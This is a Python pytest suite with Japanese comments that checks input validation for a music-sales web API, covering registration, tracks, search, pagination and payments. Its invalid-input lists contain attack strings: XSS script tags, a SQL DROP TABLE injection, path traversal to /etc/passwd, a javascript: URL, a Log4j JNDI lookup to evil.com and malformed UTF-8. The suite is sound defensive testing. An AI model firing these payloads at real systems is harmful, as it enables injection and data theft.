"""
データ検証・バリデーション包括テストスイート

入力データの検証、サニタイゼーション、型チェック、制約チェックを徹底的にテストします。
"""

import pytest
import json
import re
from datetime import datetime, date, timedelta
from decimal import Decimal
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from unittest.mock import patch, MagicMock
import math

from app.main import app
from app.db.session import SessionLocal
from seed_data import create_seed_data


class TestDataValidationComprehensive:
    """データ検証包括テストクラス"""
    
    @classmethod
    def setup_class(cls):
        """データ検証テストセットアップ"""
        print("🔍 データ検証包括テスト開始...")
        create_seed_data()
        cls.client = TestClient(app)
        cls.session = SessionLocal()
        print("✅ データ検証テスト環境準備完了")
    
    @classmethod
    def teardown_class(cls):
        """データ検証テストクリーンアップ"""
        cls.session.close()
    
    # ==================== ユーザー登録データ検証テスト ====================
    
    def test_email_validation_comprehensive(self):
        """包括的メールアドレス検証テスト"""
        
        # 有効なメールアドレス
        valid_emails = [
            "test@example.com",
            "user.name@example.com",
            "user+tag@example.com",
            "user123@example123.com",
            "test@sub.example.com",
            "user@example-domain.com",
            "user@example.co.jp",
            "test@localhost",  # ローカル環境では有効
            "a@b.co",
            "very.long.email.address@very.long.domain.name.com",
        ]
        
        for email in valid_emails:
            user_data = {
                "email": email,
                "display_name": "Valid Email Test",
                "firebase_uid": f"valid_uid_{hash(email)}",
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code in [200, 400]  # 重複チェックで400の場合もある
        
        # 無効なメールアドレス
        invalid_emails = [
            "",  # 空文字
            " ",  # スペースのみ
            "invalid",  # @なし
            "@example.com",  # ローカル部なし
            "user@",  # ドメイン部なし
            "user..name@example.com",  # 連続ドット
            "user@example..com",  # ドメイン部連続ドット
            ".user@example.com",  # 先頭ドット
            "user.@example.com",  # 末尾ドット
            "user@example.c",  # 短すぎるTLD
            "user@example.",  # TLDなし
            "user name@example.com",  # スペース含む
            "user@exam ple.com",  # ドメインにスペース
            "user@",  # 不完全
            "a" * 65 + "@example.com",  # ローカル部が長すぎる
            "user@" + "a" * 64 + ".com",  # ドメイン部が長すぎる
            "user@example.com" + "a" * 250,  # 全体が長すぎる
            "user@@example.com",  # @が複数
            "user@example@com",  # @が複数
            "user@[192.168.1.1",  # 不正なIPアドレス形式
            "user@192.168.1.999",  # 無効なIPアドレス
        ]
        
        for email in invalid_emails:
            user_data = {
                "email": email,
                "display_name": "Invalid Email Test",
                "firebase_uid": f"invalid_uid_{hash(email)}",
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code in [400, 422], f"Failed for email: {email}"
    
    def test_display_name_validation(self):
        """表示名検証テスト"""
        
        # 有効な表示名
        valid_names = [
            "田中太郎",  # 日本語
            "John Doe",  # 英語
            "Jean-Pierre",  # ハイフン
            "O'Connor",  # アポストロフィ
            "中文用戶",  # 中国語
            "José María",  # アクセント記号
            "123User",  # 数字含む
            "User123",  # 数字含む
            "山田 花子",  # スペース含む
            "🎵MusicLover🎶",  # 絵文字含む
            "a",  # 最短
            "A" * 100,  # 長い名前
        ]
        
        for name in valid_names:
            user_data = {
                "email": f"name_test_{hash(name)}@example.com",
                "display_name": name,
                "firebase_uid": f"name_uid_{hash(name)}",
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code in [200, 400, 422]
        
        # 無効な表示名
        invalid_names = [
            "",  # 空文字
            " ",  # スペースのみ
            "   ",  # スペースのみ
            "\t",  # タブ文字
            "\n",  # 改行文字
            "\r\n",  # CRLF
            "A" * 256,  # 長すぎる
            "\x00",  # Null文字
            "\x1f",  # 制御文字
            "\x7f",  # DEL文字
            "user\u0000name",  # Null文字含む
            "user\u202ename",  # BiDi制御文字
            "<script>alert('xss')</script>",  # XSS試行
            "'; DROP TABLE user; --",  # SQLインジェクション試行
        ]
        
        for name in invalid_names:
            user_data = {
                "email": f"invalid_name_{hash(name)}@example.com",
                "display_name": name,
                "firebase_uid": f"invalid_name_uid_{hash(name)}",
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code in [400, 422], f"Failed for name: {repr(name)}"
    
    def test_user_role_validation(self):
        """ユーザーロール検証テスト"""
        
        # 有効なロール
        valid_roles = ["LISTENER", "ARTIST"]
        
        for role in valid_roles:
            user_data = {
                "email": f"role_test_{role.lower()}@example.com",
                "display_name": f"Role Test {role}",
                "firebase_uid": f"role_uid_{role.lower()}",
                "user_role": role
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code in [200, 400]
        
        # 無効なロール
        invalid_roles = [
            "",  # 空文字
            "listener",  # 小文字
            "artist",  # 小文字
            "ADMIN",  # 存在しないロール
            "ROOT",  # 存在しないロール
            "USER",  # 存在しないロール
            "MODERATOR",  # 存在しないロール
            123,  # 数値
            None,  # Null
            "LISTENER,ARTIST",  # 複数ロール
            "LISTENER OR ARTIST",  # 論理演算子
            "'; DROP TABLE user; --",  # SQLインジェクション
        ]
        
        for role in invalid_roles:
            user_data = {
                "email": f"invalid_role_{hash(str(role))}@example.com",
                "display_name": "Invalid Role Test",
                "firebase_uid": f"invalid_role_uid_{hash(str(role))}",
                "user_role": role
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code in [400, 422], f"Failed for role: {role}"
    
    def test_firebase_uid_validation(self):
        """Firebase UID検証テスト"""
        
        # 有効なFirebase UID（通常は28文字の英数字）
        valid_uids = [
            "abcdefghijklmnopqrstuvwxyz12",  # 28文字
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ12",  # 大文字
            "1234567890abcdefghijklmnop12",  # 数字含む
            "firebase_uid_123456789012345",  # アンダースコア含む
            "a" * 28,  # 最小長
            "1" * 28,  # 数字のみ
        ]
        
        for uid in valid_uids:
            user_data = {
                "email": f"uid_test_{hash(uid)}@example.com",
                "display_name": "UID Test",
                "firebase_uid": uid,
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code in [200, 400]
        
        # 無効なFirebase UID
        invalid_uids = [
            "",  # 空文字
            "short",  # 短すぎる
            "a" * 129,  # 長すぎる
            "uid with spaces",  # スペース含む
            "uid-with-hyphens",  # ハイフン含む
            "uid@with@symbols",  # 記号含む
            "uid\nwith\nnewlines",  # 改行含む
            "uid\x00with\x00null",  # Null文字含む
            None,  # Null
            123,  # 数値
            "'; DROP TABLE user; --",  # SQLインジェクション
        ]
        
        for uid in invalid_uids:
            user_data = {
                "email": f"invalid_uid_{hash(str(uid))}@example.com",
                "display_name": "Invalid UID Test",
                "firebase_uid": uid,
                "user_role": "LISTENER"
            }
            
            response = self.client.post("/api/v1/auth/register", json=user_data)
            assert response.status_code in [400, 422], f"Failed for UID: {uid}"
    
    # ==================== 楽曲データ検証テスト ====================
    
    def test_track_title_validation(self):
        """楽曲タイトル検証テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 有効なタイトル
        valid_titles = [
            "素晴らしい楽曲",  # 日本語
            "Amazing Song",  # 英語
            "Canción Hermosa",  # スペイン語
            "La Vie En Rose",  # フランス語
            "Song #1",  # 記号含む
            "Track-001",  # ハイフン含む
            "Song (Remix)",  # 括弧含む
            "🎵 Music 🎶",  # 絵文字含む
            "A",  # 最短
            "Very Long Song Title That Contains Many Words And Characters" * 3,  # 長いタイトル
        ]
        
        for title in valid_titles:
            track_data = {
                "title": title,
                "description": "Valid title test",
                "genre": "テスト",
                "duration": 180,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [200, 400, 422]
        
        # 無効なタイトル
        invalid_titles = [
            "",  # 空文字
            " ",  # スペースのみ
            "\t\n\r",  # 制御文字のみ
            "A" * 1001,  # 長すぎる
            "\x00",  # Null文字
            "title\x00injection",  # Null文字含む
            None,  # Null
            123,  # 数値
            ["title"],  # 配列
            {"title": "nested"},  # オブジェクト
        ]
        
        for title in invalid_titles:
            track_data = {
                "title": title,
                "description": "Invalid title test",
                "genre": "テスト",
                "duration": 180,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [400, 422], f"Failed for title: {title}"
    
    def test_track_duration_validation(self):
        """楽曲再生時間検証テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 有効な再生時間（秒）
        valid_durations = [
            1,  # 最短
            30,  # 短い楽曲
            180,  # 標準的な長さ
            300,  # 5分
            600,  # 10分
            1200,  # 20分
            3600,  # 1時間
            7200,  # 2時間（長いクラシック等）
        ]
        
        for duration in valid_durations:
            track_data = {
                "title": f"Duration Test {duration}s",
                "description": "Duration validation test",
                "genre": "テスト",
                "duration": duration,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [200, 400, 422]
        
        # 無効な再生時間
        invalid_durations = [
            0,  # ゼロ
            -1,  # 負の値
            -999,  # 大きな負の値
            10800,  # 3時間（長すぎる）
            999999,  # 極端に長い
            1.5,  # 小数点
            "180",  # 文字列
            None,  # Null
            float('inf'),  # 無限大
            float('nan'),  # NaN
        ]
        
        for duration in invalid_durations:
            track_data = {
                "title": f"Invalid Duration Test",
                "description": "Invalid duration test",
                "genre": "テスト",
                "duration": duration,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [400, 422], f"Failed for duration: {duration}"
    
    def test_track_price_validation(self):
        """楽曲価格検証テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 有効な価格
        valid_prices = [
            0,  # 無料
            100,  # 安い楽曲
            300,  # 標準価格
            500,  # やや高い
            1000,  # 高い楽曲
            9999,  # 最高価格
            100.0,  # 整数として表現される小数
            299.99,  # 小数点価格
        ]
        
        for price in valid_prices:
            track_data = {
                "title": f"Price Test {price}",
                "description": "Price validation test",
                "genre": "テスト",
                "duration": 180,
                "price": price
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [200, 400, 422]
        
        # 無効な価格
        invalid_prices = [
            -1,  # 負の価格
            -999,  # 大きな負の価格
            10000,  # 高すぎる価格
            999999,  # 極端に高い価格
            0.001,  # 小さすぎる小数
            "300",  # 文字列
            None,  # Null
            float('inf'),  # 無限大
            float('nan'),  # NaN
            [300],  # 配列
            {"price": 300},  # オブジェクト
        ]
        
        for price in invalid_prices:
            track_data = {
                "title": "Invalid Price Test",
                "description": "Invalid price test",
                "genre": "テスト",
                "duration": 180,
                "price": price
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [400, 422], f"Failed for price: {price}"
    
    def test_track_genre_validation(self):
        """楽曲ジャンル検証テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 有効なジャンル
        valid_genres = [
            "ポップ",
            "ロック",
            "ジャズ",
            "クラシック",
            "エレクトロニック",
            "フォーク",
            "ヒップホップ",
            "R&B",
            "カントリー",
            "ブルース",
            "レゲエ",
            "パンク",
            "メタル",
            "その他",
        ]
        
        for genre in valid_genres:
            track_data = {
                "title": f"Genre Test {genre}",
                "description": "Genre validation test",
                "genre": genre,
                "duration": 180,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [200, 400, 422]
        
        # 無効なジャンル
        invalid_genres = [
            "",  # 空文字
            " ",  # スペースのみ
            "InvalidGenre",  # 未定義ジャンル
            "POPS",  # 大文字
            "pop",  # 小文字
            "ポップス",  # 類似だが異なる
            "A" * 101,  # 長すぎる
            None,  # Null
            123,  # 数値
            ["ポップ"],  # 配列
            {"genre": "ポップ"},  # オブジェクト
        ]
        
        for genre in invalid_genres:
            track_data = {
                "title": "Invalid Genre Test",
                "description": "Invalid genre test",
                "genre": genre,
                "duration": 180,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [400, 422], f"Failed for genre: {genre}"
    
    def test_track_url_validation(self):
        """楽曲URL検証テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 有効なURL
        valid_urls = [
            "https://example.com/audio.mp3",
            "https://s3.amazonaws.com/bucket/track.mp3",
            "https://cdn.example.com/music/track.mp3",
            "https://storage.googleapis.com/bucket/audio.mp3",
            "https://example.com/track-with-hyphens.mp3",
            "https://example.com/track_with_underscores.mp3",
            "https://example.com/track%20with%20spaces.mp3",  # URL encoded
            "https://sub.domain.example.com/path/to/track.mp3",
            "https://example.com:8080/track.mp3",  # ポート指定
        ]
        
        for url in valid_urls:
            track_data = {
                "title": "URL Test",
                "description": "URL validation test",
                "genre": "テスト",
                "audio_file_url": url,
                "cover_art_url": url.replace(".mp3", ".jpg"),
                "duration": 180,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [200, 400, 422]
        
        # 無効なURL
        invalid_urls = [
            "",  # 空文字
            "not-a-url",  # URLでない文字列
            "http://example.com/track.mp3",  # HTTPSでない
            "ftp://example.com/track.mp3",  # 無効なプロトコル
            "file:///etc/passwd",  # ローカルファイル
            "javascript:alert('xss')",  # JavaScript URL
            "data:audio/mp3;base64,fake",  # Data URL
            "//example.com/track.mp3",  # プロトコル相対URL
            "https://",  # 不完全なURL
            "https://example",  # TLDなし
            "https://localhost/track.mp3",  # localhost
            "https://127.0.0.1/track.mp3",  # IP address
            "https://10.0.0.1/track.mp3",  # Private IP
            "https://example.com/../../../etc/passwd",  # Path traversal
            None,  # Null
            123,  # 数値
        ]
        
        for url in invalid_urls:
            track_data = {
                "title": "Invalid URL Test",
                "description": "Invalid URL test",
                "genre": "テスト",
                "audio_file_url": url,
                "cover_art_url": "https://example.com/cover.jpg",
                "duration": 180,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [400, 422], f"Failed for URL: {url}"
    
    def test_track_date_validation(self):
        """楽曲リリース日検証テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        today = date.today()
        
        # 有効な日付
        valid_dates = [
            today.isoformat(),  # 今日
            (today - timedelta(days=1)).isoformat(),  # 昨日
            (today + timedelta(days=1)).isoformat(),  # 明日
            "2023-01-01",  # 過去の日付
            "2025-12-31",  # 未来の日付
            "1990-01-01",  # 古い日付
        ]
        
        for date_str in valid_dates:
            track_data = {
                "title": f"Date Test {date_str}",
                "description": "Date validation test",
                "genre": "テスト",
                "duration": 180,
                "price": 300.0,
                "release_date": date_str
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [200, 400, 422]
        
        # 無効な日付
        invalid_dates = [
            "",  # 空文字
            "invalid-date",  # 無効な形式
            "2023-13-01",  # 無効な月
            "2023-02-30",  # 無効な日
            "2023/01/01",  # 間違った区切り文字
            "01-01-2023",  # 間違った順序
            "2023-1-1",  # ゼロパディングなし
            "2023-01-01T00:00:00",  # 時刻情報含む
            "1800-01-01",  # 古すぎる日付
            "2100-01-01",  # 未来すぎる日付
            None,  # Null
            123,  # 数値
            ["2023-01-01"],  # 配列
        ]
        
        for date_str in invalid_dates:
            track_data = {
                "title": "Invalid Date Test",
                "description": "Invalid date test",
                "genre": "テスト",
                "duration": 180,
                "price": 300.0,
                "release_date": date_str
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            assert response.status_code in [400, 422], f"Failed for date: {date_str}"
    
    # ==================== 検索パラメータ検証テスト ====================
    
    def test_search_query_validation(self):
        """検索クエリ検証テスト"""
        
        # 有効な検索クエリ
        valid_queries = [
            "青空",  # 日本語
            "music",  # 英語
            "rock music",  # スペース含む
            "A-B",  # ハイフン含む
            "song #1",  # 記号含む
            "🎵",  # 絵文字
            "a",  # 1文字
            "A" * 100,  # 長いクエリ
        ]
        
        for query in valid_queries:
            response = self.client.get(f"/api/v1/tracks/?search={query}")
            assert response.status_code in [200, 400, 422]
        
        # 無効または危険な検索クエリ
        dangerous_queries = [
            "A" * 10001,  # 極端に長いクエリ
            "\x00",  # Null文字
            "query\x00injection",  # Null文字含む
            "'; DROP TABLE track; --",  # SQLインジェクション
            "<script>alert('xss')</script>",  # XSS試行
            "../../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/}",  # Log4j injection
        ]
        
        for query in dangerous_queries:
            response = self.client.get(f"/api/v1/tracks/?search={query}")
            
            # 危険なクエリは適切に処理されるべき
            assert response.status_code in [200, 400, 422]
            
            # レスポンスに危険なコンテンツが含まれていないことを確認
            if response.status_code == 200:
                content = response.text.lower()
                assert "<script>" not in content
                assert "javascript:" not in content
                assert "drop table" not in content
    
    def test_pagination_validation(self):
        """ページネーション検証テスト"""
        
        # 有効なページネーションパラメータ
        valid_params = [
            (0, 10),  # 標準
            (0, 1),   # 最小limit
            (0, 100), # 最大limit
            (10, 20), # オフセットあり
        ]
        
        for skip, limit in valid_params:
            response = self.client.get(f"/api/v1/tracks/?skip={skip}&limit={limit}")
            assert response.status_code in [200, 400, 422]
        
        # 無効なページネーションパラメータ
        invalid_params = [
            (-1, 10),   # 負のskip
            (0, 0),     # ゼロlimit
            (0, -1),    # 負のlimit
            (0, 1001),  # 大きすぎるlimit
            (999999, 10),  # 大きすぎるskip
            ("invalid", 10),  # 文字列skip
            (0, "invalid"),   # 文字列limit
            (1.5, 10),  # 小数点skip
            (0, 10.5),  # 小数点limit
        ]
        
        for skip, limit in invalid_params:
            response = self.client.get(f"/api/v1/tracks/?skip={skip}&limit={limit}")
            assert response.status_code in [400, 422], f"Failed for skip={skip}, limit={limit}"
    
    # ==================== 決済データ検証テスト ====================
    
    def test_payment_amount_validation(self):
        """決済金額検証テスト"""
        headers = {"Authorization": "Bearer mock_token_listener"}
        
        # 正常な楽曲価格を取得
        tracks_response = self.client.get("/api/v1/tracks/?limit=1")
        if tracks_response.status_code != 200:
            pytest.skip("楽曲データが取得できないため、決済テストをスキップ")
            
        tracks = tracks_response.json()
        if not tracks:
            pytest.skip("楽曲データが存在しないため、決済テストをスキップ")
            
        track = tracks[0]
        track_id = track["id"]
        expected_amount = track["price"]
        
        # 有効な決済金額（楽曲価格と一致）
        valid_amounts = [
            expected_amount,  # 正確な金額
            float(expected_amount),  # float型
            int(expected_amount) if expected_amount == int(expected_amount) else expected_amount,  # int型
        ]
        
        for amount in valid_amounts:
            purchase_data = {
                "track_id": track_id,
                "amount": amount,
                "payment_method": "CREDIT_CARD",
                "payment_token": f"valid_token_{hash(str(amount))}"
            }
            
            response = self.client.post("/api/v1/purchases/", 
                                      headers=headers, json=purchase_data)
            # 金額が正確であれば処理される（他の要因で失敗する可能性はある）
            assert response.status_code in [200, 400, 422]
        
        # 無効な決済金額
        invalid_amounts = [
            expected_amount + 0.01,  # わずかに高い
            expected_amount - 0.01,  # わずかに安い
            expected_amount * 2,     # 2倍の金額
            expected_amount / 2,     # 半分の金額
            0,                       # ゼロ金額
            -expected_amount,        # 負の金額
            999999,                  # 極端に高い金額
            "invalid",               # 文字列
            None,                    # Null
            float('inf'),            # 無限大
            float('nan'),            # NaN
        ]
        
        for amount in invalid_amounts:
            purchase_data = {
                "track_id": track_id,
                "amount": amount,
                "payment_method": "CREDIT_CARD",
                "payment_token": f"invalid_token_{hash(str(amount))}"
            }
            
            response = self.client.post("/api/v1/purchases/", 
                                      headers=headers, json=purchase_data)
            assert response.status_code in [400, 422], f"Failed for amount: {amount}"
    
    def test_payment_method_validation(self):
        """決済方法検証テスト"""
        headers = {"Authorization": "Bearer mock_token_listener"}
        
        # 楽曲情報を取得
        tracks_response = self.client.get("/api/v1/tracks/?limit=1")
        if tracks_response.status_code != 200 or not tracks_response.json():
            pytest.skip("楽曲データが取得できないため、決済テストをスキップ")
            
        track = tracks_response.json()[0]
        
        # 有効な決済方法
        valid_methods = [
            "CREDIT_CARD",
            "PAYPAL",
            "BANK_TRANSFER",
        ]
        
        for method in valid_methods:
            purchase_data = {
                "track_id": track["id"],
                "amount": track["price"],
                "payment_method": method,
                "payment_token": f"token_{method.lower()}"
            }
            
            response = self.client.post("/api/v1/purchases/", 
                                      headers=headers, json=purchase_data)
            assert response.status_code in [200, 400, 422]
        
        # 無効な決済方法
        invalid_methods = [
            "",  # 空文字
            "credit_card",  # 小文字
            "CASH",  # サポートされていない方法
            "BITCOIN",  # サポートされていない方法
            "INVALID_METHOD",  # 存在しない方法
            123,  # 数値
            None,  # Null
            ["CREDIT_CARD"],  # 配列
            {"method": "CREDIT_CARD"},  # オブジェクト
        ]
        
        for method in invalid_methods:
            purchase_data = {
                "track_id": track["id"],
                "amount": track["price"],
                "payment_method": method,
                "payment_token": "test_token"
            }
            
            response = self.client.post("/api/v1/purchases/", 
                                      headers=headers, json=purchase_data)
            assert response.status_code in [400, 422], f"Failed for method: {method}"
    
    # ==================== 型チェック・キャスト検証テスト ====================
    
    def test_numeric_type_validation(self):
        """数値型検証テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 数値として解釈される可能性のある値
        numeric_test_cases = [
            # (値, 期待される動作)
            ("180", "文字列数値"),
            ("180.0", "文字列小数"),
            ("1.23e2", "科学記法"),
            ("0x100", "16進数"),
            ("0o100", "8進数"),
            ("0b1010", "2進数"),
            ("  180  ", "前後スペース"),
            ("180\n", "改行含む"),
            ("180abc", "数値+文字"),
            ("abc180", "文字+数値"),
            ("", "空文字"),
            ("Infinity", "無限大文字列"),
            ("NaN", "NaN文字列"),
        ]
        
        for test_value, description in numeric_test_cases:
            track_data = {
                "title": f"Numeric Test: {description}",
                "description": "Numeric validation test",
                "genre": "テスト",
                "duration": test_value,  # 数値フィールドに文字列を送信
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            
            # 厳密な型チェックが行われ、不正な型は拒否されるべき
            if isinstance(test_value, str) and not test_value.strip().isdigit():
                assert response.status_code in [400, 422], f"Failed for {description}: {test_value}"
    
    def test_boolean_type_validation(self):
        """真偽値型検証テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 真偽値として解釈される可能性のある値
        boolean_test_cases = [
            (True, "真のboolean"),
            (False, "偽のboolean"),
            ("true", "文字列true"),
            ("false", "文字列false"),
            ("True", "大文字True"),
            ("False", "大文字False"),
            (1, "数値1"),
            (0, "数値0"),
            ("1", "文字列1"),
            ("0", "文字列0"),
            ("yes", "文字列yes"),
            ("no", "文字列no"),
            (None, "Null値"),
            ("", "空文字"),
        ]
        
        for test_value, description in boolean_test_cases:
            track_data = {
                "title": f"Boolean Test: {description}",
                "description": "Boolean validation test",
                "genre": "テスト",
                "duration": 180,
                "price": 300.0,
                "is_public": test_value  # 真偽値フィールド
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            
            # 厳密な型チェックが行われるべき
            if not isinstance(test_value, bool):
                assert response.status_code in [400, 422], f"Failed for {description}: {test_value}"
    
    # ==================== Unicode・文字エンコーディング検証テスト ====================
    
    def test_unicode_normalization(self):
        """Unicode正規化テスト"""
        headers = {"Authorization": "Bearer mock_token_artist"}
        
        # 異なるUnicode正規化形式
        unicode_test_cases = [
            ("café", "NFC: é as single character"),
            ("cafe\u0301", "NFD: e + combining acute"),
            ("ﬁle", "NFKC: ligature fi"),
            ("①", "NFKD: circled 1"),
            ("Ａ", "Full-width A"),
            ("Ⅰ", "Roman numeral I"),
            ("＃", "Full-width #"),
        ]
        
        for text, description in unicode_test_cases:
            track_data = {
                "title": text,
                "description": f"Unicode test: {description}",
                "genre": "テスト",
                "duration": 180,
                "price": 300.0
            }
            
            response = self.client.post("/api/v1/tracks/", headers=headers, json=track_data)
            
            if response.status_code == 200:
                # 作成された楽曲のタイトルが適切に正規化されているかチェック
                created_track = response.json()
                # Unicode正規化が一貫して行われることを確認
                assert created_track["title"] is not None
                assert len(created_track["title"]) > 0
    
    def test_encoding_edge_cases(self):
        """エンコーディング境界ケーステスト"""
        
        # 様々なエンコーディングでの攻撃試行
        encoding_attacks = [
            b"\\x00",  # Null byte
            b"\\xFF",  # Invalid UTF-8
            b"\\xC0\\x80",  # Overlong encoding
            b"\\xED\\xA0\\x80",  # High surrogate
            b"\\xED\\xB0\\x80",  # Low surrogate
        ]
        
        for attack in encoding_attacks:
            try:
                # バイナリデータを直接送信
                response = self.client.post("/api/v1/auth/register", 
                                          data=attack,
                                          headers={"Content-Type": "application/json"})
                
                # 不正なエンコーディングは適切に処理されるべき
                assert response.status_code in [400, 422]
                
            except Exception:
                # エンコーディングエラーは例外として処理される場合もある
                pass